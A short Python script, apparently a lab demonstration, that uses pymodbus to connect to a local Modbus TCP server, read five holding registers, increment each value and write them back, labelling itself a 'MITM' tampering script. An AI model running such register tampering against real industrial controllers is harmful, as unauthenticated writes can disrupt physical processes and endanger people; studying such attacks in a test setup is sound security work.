from pymodbus.client.sync import ModbusTcpClient

def intercept_and_modify_values():
    client = ModbusTcpClient('127.0.0.1', port=5020)

    read_values = client.read_holding_registers(0, 5, unit=0x01)
    print("Values read from server registers by the MITM script:", read_values.registers)

    modified_values = [value + 1 for value in read_values.registers]
    print("Modified values to be sent to server:", modified_values)

    client.write_registers(0, modified_values, unit=0x01)
    print("Modified values sent to server by the MITM script:", modified_values)

    client.close()

if __name__ == "__main__":
    intercept_and_modify_values()
